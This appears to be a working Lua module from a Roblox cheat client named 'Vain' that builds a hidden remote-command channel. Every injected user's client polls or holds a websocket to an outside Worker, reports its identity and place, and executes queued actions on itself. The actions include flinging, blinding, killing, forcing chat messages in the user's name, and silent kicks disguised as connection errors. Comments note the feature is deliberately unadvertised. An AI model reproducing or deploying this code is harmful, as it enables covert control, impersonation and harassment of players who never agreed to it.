--[[
	Troll command library.

	Two halves of the same feature, both talking to the rank Worker in server/:

	  RECEIVING -- every Vain client polls GET /commands/<its own UserId> and
	  runs whatever came back. That's what makes "commands only work on Vain
	  users" literally true: nothing is pushed at anyone, a target who isn't
	  injected simply never asks for their commands and they expire.

	  SENDING -- a Privileged/Owner user fires POST /troll with their token
	  (from `/whitelist token` in Discord, pasted into Settings -> General ->
	  Token). The Worker, not this file, decides whether they outrank the target
	  -- everything here is a convenience shell around that call, so patching the
	  client only ever lets someone lie to themselves. Nothing in the menu
	  advertises any of this: there's no module, and send() is only reachable
	  through vain.Libraries.troll for anyone who knows it's there.

	The ACTIONS table below is the ENTIRE vocabulary, and it deliberately has no
	"run this code" entry: the queue carries an action name plus a duration or a
	bit of text, never anything this file executes as code. Keep the keys in
	sync with TROLL_ACTIONS in server/src/troll.js -- that pairing is the wire
	format.

	Effects are local and cosmetic-ish by nature (this is a client-side script
	running on the victim's machine, so it can only do what their own client can
	do to itself) and every timed one restores what it touched when it ends.
]]
local trolllib = {
	API = 'https://vain.baconcrafft.workers.dev',
	TokenFile = 'vain/profiles/ranktoken.txt',
	Running = false,
	-- Injected by games/universal.lua so this file doesn't have to reach into
	-- the GUI itself (and so it degrades to a no-op if it's loaded standalone).
	Notify = function() end,
}

local cloneref = cloneref or function(obj)
	return obj
end
local playersService = cloneref(game:GetService('Players'))
local runService = cloneref(game:GetService('RunService'))
local httpService = cloneref(game:GetService('HttpService'))
local coreGui = cloneref(game:GetService('CoreGui'))
local textChatService = cloneref(game:GetService('TextChatService'))
local replicatedStorage = cloneref(game:GetService('ReplicatedStorage'))
local lplr = playersService.LocalPlayer

local req = (syn and syn.request) or (http and http.request) or request or (fluxus and fluxus.request)
local isfile = isfile or function(file)
	local suc, res = pcall(function()
		return readfile(file)
	end)
	return suc and res ~= nil and res ~= ''
end
-- Same fallback the loader uses: executors without delfile get an empty file,
-- which the isfile above then reads as "no token".
local delfile = delfile or function(file) writefile(file, '') end

-- Listening is a LONG POLL, not a poll: the Worker holds the request open for
-- HOLD_SECONDS and answers the instant a command lands. One request therefore
-- covers 20s of listening rather than 5s, which is what keeps an injected user
-- inside Cloudflare's 100k requests/day free tier (~4.1k/day each instead of
-- ~17.3k) without making anything slower -- a held request returns as soon as
-- there's something to return.
--
-- Not every executor will keep an HTTP request open that long, so two failures
-- in a row drop this client to plain polling for the session (FALLBACK_INTERVAL,
-- the old behaviour) rather than spinning on requests that keep timing out.
local HOLD_SECONDS = 20
local IDLE_INTERVAL = 1
local FALLBACK_INTERVAL = 5
-- Socket heartbeat. Not a poll: it carries no request and gets no answer beyond
-- an empty ack. It exists to keep idle intermediaries from closing the
-- connection, and to refresh the presence key /list reads.
local SOCKET_HEARTBEAT = 45
local SOCKET_RETRY = 5
-- While in fallback, retry a hold this often, so a Worker that starts honouring
-- ?wait= later (a deploy, an outage ending) is picked up without a reinject.
local PROBE_INTERVAL = 300
-- Never run more than this many effects from a single poll, however many the
-- queue somehow ended up holding.
local MAX_PER_POLL = 3

-- Ordered for the in-game dropdown (Name is what the UI shows, Action is the
-- wire value). Timed actions take Seconds; Message actions take text.
-- Silent = no "X used <action> on you" notification when it fires. The visible
-- pranks announce themselves (attribution is the joke); the ones that end the
-- session stay quiet, since a kick that names Vain would undo the point of its
-- anti-cheat-flavoured reason.
trolllib.Actions = {
	{Name = 'Fling', Action = 'fling', Tooltip = 'Launches their character across the map.'},
	{Name = 'Spin', Action = 'spin', Timed = true, Tooltip = 'Spins their character like a top.'},
	{Name = 'Freeze', Action = 'freeze', Timed = true, Tooltip = 'Anchors them in place.'},
	{Name = 'Shake', Action = 'shake', Timed = true, Tooltip = 'Shakes their camera around.'},
	{Name = 'Invert', Action = 'invert', Timed = true, Tooltip = 'Inverts their movement controls.'},
	{Name = 'Blind', Action = 'blind', Timed = true, Tooltip = 'Blacks out their screen.'},
	{Name = 'Speed', Action = 'speed', Timed = true, Tooltip = 'Makes them uncontrollably fast.'},
	{Name = 'Drunk', Action = 'drunk', Timed = true, Tooltip = 'Rolls their camera around drunkenly.'},
	{Name = 'Flip', Action = 'flip', Timed = true, Tooltip = 'Turns their camera upside down.'},
	{Name = 'Zoom', Action = 'zoom', Timed = true, Tooltip = 'Yanks their field of view to a fisheye.'},
	{Name = 'Void', Action = 'void', Tooltip = 'Drops them through the map.'},
	{Name = 'Say', Action = 'say', Message = true, Silent = true, Tooltip = 'Makes them say something in chat.'},
	{Name = 'Notify', Action = 'notify', Message = true, Silent = true, Tooltip = 'Pops a Vain notification on their screen.'},
	{Name = 'Kill', Action = 'kill', Silent = true, Tooltip = 'Kills their character.'},
	{Name = 'Kick', Action = 'kick', Silent = true, Tooltip = 'Disconnects them from the game.'},
	{Name = 'Uninject', Action = 'uninject', Silent = true, Tooltip = 'Uninjects their Vain immediately.'},
}

trolllib.ActionNames = {}
local actionByName = {}
local actionByWire = {}
for _, v in trolllib.Actions do
	table.insert(trolllib.ActionNames, v.Name)
	actionByName[v.Name] = v
	actionByWire[v.Action] = v
end

-- Accepts either the display name ('Kick') or the wire/command word ('kick'),
-- so the in-game command bar can pass exactly what the user typed.
function trolllib.getAction(name)
	if not name then return nil end
	return actionByName[name] or actionByWire[tostring(name):lower()]
end

-- ── token storage ────────────────────────────────────────────────────────────
-- Kept in its own file rather than a saved GUI option on purpose: profiles get
-- exported/imported through the clipboard (see the Profiles window), and a
-- token pasted into a saved option would ride along with any profile the user
-- shares. This file is never part of that. The Token box in Settings -> General
-- (guis/new.lua) writes through setToken below.

function trolllib.getToken()
	if not isfile(trolllib.TokenFile) then return '' end
	local ok, res = pcall(readfile, trolllib.TokenFile)
	return (ok and type(res) == 'string' and res or ''):match('^%s*(.-)%s*$')
end

function trolllib.setToken(token)
	token = tostring(token or ''):match('^%s*(.-)%s*$')
	if token == '' then
		pcall(delfile, trolllib.TokenFile)
		return true
	end
	if not token:match('^%x+$') or #token ~= 48 then
		return false, 'That does not look like a Vain token -- run /whitelist token in Discord and copy the whole thing.'
	end
	local ok = pcall(writefile, trolllib.TokenFile, token)
	return ok, (not ok) and 'Could not write the token file.' or nil
end

-- ── effects ──────────────────────────────────────────────────────────────────

local activeEffects = {}

local function getCharacter()
	local char = lplr.Character
	if not char or not char.Parent then return nil end
	local hum = char:FindFirstChildOfClass('Humanoid')
	local root = (hum and hum.RootPart) or char:FindFirstChild('HumanoidRootPart')
	if not root then return nil end
	return char, hum, root
end

-- Runs func(char, hum, root) every Heartbeat for `seconds`, then finish(). The
-- character is re-resolved each tick so a respawn mid-effect doesn't leave a
-- dead reference behind (or worse, leave the OLD root anchored forever).
local function runFor(action, seconds, func, finish)
	if activeEffects[action] then return end -- already running, don't stack restores
	activeEffects[action] = true

	task.spawn(function()
		local finished = tick() + seconds
		while tick() < finished and trolllib.Running do
			local char, hum, root = getCharacter()
			if char then pcall(func, char, hum, root) end
			runService.Heartbeat:Wait()
		end
		if finish then pcall(finish, getCharacter()) end
		activeEffects[action] = nil
	end)
end

-- Camera effects have to fight the game's own camera script, which rewrites
-- CFrame every frame at RenderPriority.Camera -- so they bind one priority
-- ABOVE it and get the last word, instead of being overwritten on Heartbeat.
local function runRender(action, seconds, func)
	if activeEffects[action] then return end
	activeEffects[action] = true

	local name = 'VainTroll'..action
	local bound = pcall(function()
		runService:BindToRenderStep(name, Enum.RenderPriority.Camera.Value + 1, func)
	end)
	task.delay(seconds, function()
		if bound then pcall(function() runService:UnbindFromRenderStep(name) end) end
		activeEffects[action] = nil
	end)
end

local function overlayParent()
	if gethui then
		local ok, res = pcall(gethui)
		if ok and res then return res end
	end
	return coreGui
end

local EFFECTS = {}

EFFECTS.fling = function()
	-- One velocity assignment gets damped away almost immediately, so keep
	-- re-applying it for a moment; the spin is what turns a shove into a fling.
	runFor('fling', 0.5, function(_, hum, root)
		if hum then hum.PlatformStand = true end
		root.AssemblyLinearVelocity = Vector3.new(math.random(-120, 120), 180, math.random(-120, 120))
		root.AssemblyAngularVelocity = Vector3.new(math.random(-40, 40), 60, math.random(-40, 40))
	end, function(_, hum)
		if hum then hum.PlatformStand = false end
	end)
end

EFFECTS.spin = function(cmd)
	-- Rotating the root directly rather than throwing angular velocity at it:
	-- the Humanoid keeps itself upright and re-aims via AutoRotate, so velocity
	-- alone gets damped into a wobble. AutoRotate goes back exactly as found.
	local autoRotate
	runFor('spin', cmd.seconds or 5, function(_, hum, root)
		if hum then
			if autoRotate == nil then autoRotate = hum.AutoRotate end
			hum.AutoRotate = false
		end
		root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(25), 0)
	end, function(_, hum)
		if hum and autoRotate ~= nil then hum.AutoRotate = autoRotate end
	end)
end

EFFECTS.freeze = function(cmd)
	runFor('freeze', cmd.seconds or 5, function(_, _, root)
		root.Anchored = true
	end, function(_, _, root)
		if root then root.Anchored = false end
	end)
end

EFFECTS.shake = function(cmd)
	local original
	runFor('shake', cmd.seconds or 5, function(_, hum)
		if not hum then return end
		original = original or hum.CameraOffset
		hum.CameraOffset = original + Vector3.new(math.random(-10, 10) / 8, math.random(-10, 10) / 8, math.random(-10, 10) / 8)
	end, function(_, hum)
		if hum then hum.CameraOffset = original or Vector3.zero end
	end)
end

EFFECTS.invert = function(cmd)
	-- The game's own control script sets MoveDirection every frame on
	-- RenderStepped; re-Moving the negation on Heartbeat (which runs after)
	-- lands last each frame, so the character walks backwards instead of the
	-- two fighting each other.
	runFor('invert', cmd.seconds or 5, function(_, hum)
		if hum and hum.MoveDirection.Magnitude > 0 then
			hum:Move(-hum.MoveDirection, false)
		end
	end)
end

EFFECTS.blind = function(cmd)
	if activeEffects.blind then return end
	activeEffects.blind = true

	local gui = Instance.new('ScreenGui')
	gui.Name = 'VainTroll'
	gui.DisplayOrder = 999999
	gui.IgnoreGuiInset = true
	gui.ResetOnSpawn = false
	local frame = Instance.new('Frame')
	frame.Size = UDim2.fromScale(1, 1)
	frame.BackgroundColor3 = Color3.new()
	frame.BorderSizePixel = 0
	frame.Parent = gui
	local label = Instance.new('TextLabel')
	label.Size = UDim2.fromScale(1, 0.1)
	label.Position = UDim2.fromScale(0, 0.45)
	label.BackgroundTransparency = 1
	label.Text = 'Trolled by '..tostring(cmd.from or 'someone')
	label.TextColor3 = Color3.fromRGB(220, 220, 220)
	label.TextScaled = true
	label.Parent = frame

	if not pcall(function() gui.Parent = overlayParent() end) then
		pcall(function() gui.Parent = lplr:FindFirstChildOfClass('PlayerGui') end)
	end

	task.delay(cmd.seconds or 5, function()
		pcall(gui.Destroy, gui)
		activeEffects.blind = nil
	end)
end

EFFECTS.speed = function(cmd)
	local original
	runFor('speed', cmd.seconds or 5, function(_, hum)
		if not hum then return end
		if original == nil then original = hum.WalkSpeed end
		hum.WalkSpeed = 90 -- reapplied every tick, so games that reset it lose
	end, function(_, hum)
		if hum and original then hum.WalkSpeed = original end
	end)
end

EFFECTS.drunk = function(cmd)
	runRender('drunk', cmd.seconds or 5, function()
		local cam = workspace.CurrentCamera
		if cam then
			cam.CFrame = cam.CFrame * CFrame.Angles(0, 0, math.rad(math.sin(os.clock() * 4) * 28))
		end
	end)
end

EFFECTS.flip = function(cmd)
	runRender('flip', cmd.seconds or 5, function()
		local cam = workspace.CurrentCamera
		if cam then
			cam.CFrame = cam.CFrame * CFrame.Angles(0, 0, math.pi)
		end
	end)
end

EFFECTS.zoom = function(cmd)
	local original
	runFor('zoom', cmd.seconds or 5, function()
		local cam = workspace.CurrentCamera
		if not cam then return end
		if original == nil then original = cam.FieldOfView end
		cam.FieldOfView = 110
	end, function()
		local cam = workspace.CurrentCamera
		if cam and original then cam.FieldOfView = original end
	end)
end

EFFECTS.void = function()
	if activeEffects.void then return end
	local char = getCharacter()
	if not char then return end
	activeEffects.void = true

	-- Only the parts that WERE colliding get restored, so this can't hand
	-- collision to accessories and hats that never had it.
	local restore = {}
	for _, part in char:GetDescendants() do
		if part:IsA('BasePart') and part.CanCollide then
			restore[part] = true
			part.CanCollide = false
		end
	end

	task.delay(2, function()
		for part in restore do
			if part.Parent then pcall(function() part.CanCollide = true end) end
		end
		activeEffects.void = nil
	end)
end

EFFECTS.say = function(cmd)
	if not cmd.message or cmd.message == '' then return end
	pcall(function()
		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
			local channels = textChatService:FindFirstChild('TextChannels')
			local general = channels and channels:FindFirstChild('RBXGeneral')
			if general then general:SendAsync(cmd.message) end
		else
			replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cmd.message, 'All')
		end
	end)
end

EFFECTS.notify = function(cmd)
	trolllib.Notify('Vain', cmd.message or "You've been trolled.", 8, 'warning')
end

EFFECTS.kill = function()
	local char, hum = getCharacter()
	if not char then return end
	-- Health first (the normal death path, so the game's own death handling
	-- runs); BreakJoints as the fallback for characters whose Humanoid health
	-- the client can't move.
	if hum then pcall(function() hum.Health = 0 end) end
	if hum and hum.Health > 0 then pcall(function() char:BreakJoints() end) end
end

EFFECTS.kick = function(cmd)
	-- Roblox owns the disconnect dialog for a client-side Kick and does not
	-- reliably show the reason we pass -- it renders its own generic "kicked by
	-- a moderator" wording instead, which gives the game away. So paint the
	-- message ourselves first, hold it long enough to read, and only then drop
	-- the connection. (An empty string would ALSO produce that generic dialog,
	-- and `or` won't catch '' the way it catches nil, hence the match.)
	local reason = cmd.message
	if type(reason) ~= 'string' or reason:match('^%s*$') then
		reason = 'Please check your internet connection'
	end

	local gui = Instance.new('ScreenGui')
	gui.Name = 'VainTroll'
	gui.DisplayOrder = 999999
	gui.IgnoreGuiInset = true
	gui.ResetOnSpawn = false
	local shade = Instance.new('Frame')
	shade.Size = UDim2.fromScale(1, 1)
	shade.BackgroundColor3 = Color3.new()
	shade.BackgroundTransparency = 0.25
	shade.BorderSizePixel = 0
	shade.Parent = gui
	local panel = Instance.new('Frame')
	panel.Size = UDim2.fromOffset(420, 130)
	panel.Position = UDim2.fromScale(0.5, 0.5)
	panel.AnchorPoint = Vector2.new(0.5, 0.5)
	panel.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
	panel.BorderSizePixel = 0
	panel.Parent = shade
	local label = Instance.new('TextLabel')
	label.Size = UDim2.new(1, -40, 1, -40)
	label.Position = UDim2.fromOffset(20, 20)
	label.BackgroundTransparency = 1
	label.Text = reason
	label.TextColor3 = Color3.fromRGB(235, 235, 235)
	label.TextSize = 18
	label.TextWrapped = true
	label.Parent = panel

	if not pcall(function() gui.Parent = overlayParent() end) then
		pcall(function() gui.Parent = lplr:FindFirstChildOfClass('PlayerGui') end)
	end

	task.delay(2.5, function()
		pcall(gui.Destroy, gui)
		pcall(function() lplr:Kick(reason) end)
	end)
end

EFFECTS.uninject = function()
	-- Uninject tears down everything Vain added, including this library's own
	-- poll loop (universal.lua registers trolllib.stop with vain:Clean), so
	-- there's nothing to unwind by hand here.
	local vain = shared.vain
	if vain and vain.Uninject then
		pcall(function() vain:Uninject() end)
	else
		trolllib.stop()
	end
end

local seen = {}

function trolllib.execute(cmd)
	if type(cmd) ~= 'table' or type(cmd.action) ~= 'string' then return end
	if cmd.id then
		if seen[cmd.id] then return end
		seen[cmd.id] = true
	end
	local effect = EFFECTS[cmd.action]
	if not effect then return end -- unknown action: a newer server, an older client

	-- Announce the visible pranks -- being flung with no idea why isn't funny,
	-- and naming the sender is half the joke. Silent actions (see Actions above)
	-- speak for themselves or deliberately don't.
	local spec = actionByWire[cmd.action]
	if not (spec and spec.Silent) then
		trolllib.Notify('Vain', tostring(cmd.from or 'Someone')..' used <b>'..cmd.action..'</b> on you.', 6, 'warning')
	end
	task.spawn(effect, cmd)
end

-- ── receiving ────────────────────────────────────────────────────────────────

-- Returns whether the request itself worked, which is what start() watches to
-- decide whether holds are viable on this executor.
function trolllib.poll(hold)
	-- Name and place ride along so this same request doubles as the presence
	-- heartbeat behind /list -- one request, not two. Both are display-only on
	-- the far side; escaped because a display name can contain anything.
	local ok, res = pcall(req, {
		Url = trolllib.API..'/commands/'..tostring(lplr.UserId)
			..'?name='..httpService:UrlEncode(lplr.Name)
			..'&place='..tostring(game.PlaceId)
			..'&wait='..tostring(hold or 0),
		Method = 'GET',
	})
	if not (ok and res and (res.StatusCode == 200 or res.Success) and res.Body) then return false end

	local decOk, decoded = pcall(httpService.JSONDecode, httpService, res.Body)
	if not decOk or type(decoded) ~= 'table' or type(decoded.commands) ~= 'table' then return false end

	for i, cmd in decoded.commands do
		if i > MAX_PER_POLL then break end
		trolllib.execute(cmd)
	end
	return true, #decoded.commands
end

-- ── websocket listening ──────────────────────────────────────────────────────
-- The preferred path by a mile: one connection, held open, carrying nothing but
-- a heartbeat. No repeated HTTP requests at all, and a command pushed by the
-- Worker's Durable Object arrives in milliseconds instead of waiting for anyone
-- to look. Executors without WebSocket support fall through to the long poll
-- below, which is slower to set up but no slower to deliver.
local socketConnect = (WebSocket and WebSocket.connect)
	or (syn and syn.websocket and syn.websocket.connect)
	or (websocket and websocket.connect)

local function socketUrl()
	return (trolllib.API:gsub('^http', 'ws'))
		..'/ws/'..tostring(lplr.UserId)
		..'?name='..httpService:UrlEncode(lplr.Name)
		..'&place='..tostring(game.PlaceId)
end

local function handlePayload(body)
	local decOk, decoded = pcall(httpService.JSONDecode, httpService, body)
	if not decOk or type(decoded) ~= 'table' or type(decoded.commands) ~= 'table' then return end
	for i, cmd in decoded.commands do
		if i > MAX_PER_POLL then break end
		trolllib.execute(cmd)
	end
end

-- Returns the socket, or nil if this executor/network can't hold one.
function trolllib.openSocket()
	if not socketConnect then return nil end

	local ok, sock = pcall(socketConnect, socketUrl())
	if not ok or not sock then return nil end

	pcall(function()
		sock.OnMessage:Connect(function(body)
			handlePayload(body)
		end)
		sock.OnClose:Connect(function()
			trolllib.Socket = nil
		end)
	end)
	trolllib.Socket = sock
	return sock
end

function trolllib.start()
	if trolllib.Running then return end
	trolllib.Running = true

	if socketConnect then
		task.spawn(function()
			local backoff = SOCKET_RETRY
			while trolllib.Running do
				if not trolllib.Socket then
					if trolllib.openSocket() then
						backoff = SOCKET_RETRY
					else
						-- Give up on sockets entirely rather than reconnecting
						-- forever; the long poll below is a working fallback.
						backoff = math.min(backoff * 2, 120)
						if backoff >= 120 then
							trolllib.SocketFailed = true
							return
						end
					end
				elseif trolllib.Socket then
					-- Heartbeat: proves we're still here (this is what keeps /list
					-- accurate) and keeps idle intermediaries from closing us.
					if not pcall(function() trolllib.Socket:Send('ping') end) then
						trolllib.Socket = nil
					end
				end
				task.wait(trolllib.Socket and SOCKET_HEARTBEAT or backoff)
			end
			if trolllib.Socket then
				pcall(function() trolllib.Socket:Close() end)
				trolllib.Socket = nil
			end
		end)
	end

	if not req then return end
	task.spawn(function()
		local holding, failures, lastProbe = true, 0, 0
		while trolllib.Running do
			-- A live socket is already listening; polling alongside it would just
			-- spend requests to be told the same thing. Wait for it to drop (or to
			-- be given up on) before taking over.
			if trolllib.Socket or (socketConnect and not trolllib.SocketFailed) then
				task.wait(SOCKET_HEARTBEAT)
				continue
			end

			local hold = holding and HOLD_SECONDS or 0
			if not holding and tick() - lastProbe > PROBE_INTERVAL then
				hold, lastProbe = HOLD_SECONDS, tick()
			end

			local started = tick()
			local ok, count = trolllib.poll(hold)
			local elapsed = tick() - started

			if hold > 0 then
				if not ok then
					-- A held request that fails twice running is an executor that
					-- won't keep one open (or a network that won't), not a blip.
					failures += 1
					if failures >= 2 then holding = false end
				elseif count == 0 and elapsed < hold * 0.5 then
					-- Answered an empty hold immediately: the far side is ignoring
					-- ?wait= (an older Worker does exactly that). Looping at
					-- IDLE_INTERVAL against it would mean ~86k requests a day --
					-- five times WORSE than the plain polling this replaced -- so
					-- treat it as no hold support at all.
					holding, failures = false, 0
				else
					holding, failures = true, 0
				end
			end

			task.wait(holding and IDLE_INTERVAL or FALLBACK_INTERVAL)
		end
	end)
end

function trolllib.stop()
	trolllib.Running = false
	if trolllib.Socket then
		pcall(function() trolllib.Socket:Close() end)
		trolllib.Socket = nil
	end
	table.clear(activeEffects)
	table.clear(seen)
end

-- ── sending ──────────────────────────────────────────────────────────────────

-- Asks which of `ids` (Roblox user ids) are injected right now and ranked below
-- you. Calls back with (list, err) where list is {{robloxUserId, name}, ...}.
-- The rank floor is enforced server-side off the token, so a client can't ask
-- about people above it however the Lua is edited.
function trolllib.detect(ids, callback)
	callback = callback or function() end

	local token = trolllib.getToken()
	if token == '' then
		return callback(nil, 'No token set -- run /whitelist token in Discord and paste it in Settings.')
	end
	if not req then
		return callback(nil, 'Your executor has no request function.')
	end

	task.spawn(function()
		local ok, res = pcall(req, {
			Url = trolllib.API..'/injected',
			Method = 'POST',
			Headers = {
				['Content-Type'] = 'application/json',
				['authorization'] = 'Bearer '..token,
			},
			Body = httpService:JSONEncode({ids = ids}),
		})
		if not (ok and res and res.Body) then
			return callback(nil, 'Could not reach the Vain server.')
		end

		local decOk, decoded = pcall(httpService.JSONDecode, httpService, res.Body)
		if not decOk or type(decoded) ~= 'table' then
			return callback(nil, 'The Vain server sent back something unreadable.')
		end
		if decoded.error then return callback(nil, decoded.error) end

		callback(type(decoded.injected) == 'table' and decoded.injected or {})
	end)
end

-- Fires POST /troll and calls back with (ok, message). Async: an HTTP round
-- trip on the main thread would hitch the game every time someone hits Send.
function trolllib.send(target, actionName, options, callback)
	callback = callback or function() end
	options = options or {}

	local action = trolllib.getAction(actionName)
	if not action then return callback(false, 'Unknown action "'..tostring(actionName)..'".') end

	target = tostring(target or ''):match('^%s*(.-)%s*$')
	if target == '' then return callback(false, 'Set a target first (a Roblox username).') end

	local token = trolllib.getToken()
	if token == '' then
		return callback(false, 'No token set -- run /whitelist token in Discord and paste it here.')
	end
	if not req then
		return callback(false, 'Your executor has no request function, so troll commands cannot be sent.')
	end

	task.spawn(function()
		local body = {target = target, action = action.Action}
		if action.Timed then body.seconds = options.Seconds end
		if action.Message then body.message = options.Message end

		local ok, res = pcall(req, {
			Url = trolllib.API..'/troll',
			Method = 'POST',
			Headers = {
				['Content-Type'] = 'application/json',
				['authorization'] = 'Bearer '..token,
			},
			Body = httpService:JSONEncode(body),
		})
		if not (ok and res and res.Body) then
			return callback(false, 'Could not reach the Vain server.')
		end

		local decOk, decoded = pcall(httpService.JSONDecode, httpService, res.Body)
		if not decOk or type(decoded) ~= 'table' then
			return callback(false, 'The Vain server sent back something unreadable.')
		end
		if decoded.error then return callback(false, decoded.error) end

		callback(true, 'Sent '..action.Name:lower()..' to '..tostring(decoded.target or target)..'.')
	end)
end

return trolllib

--VAINEOF
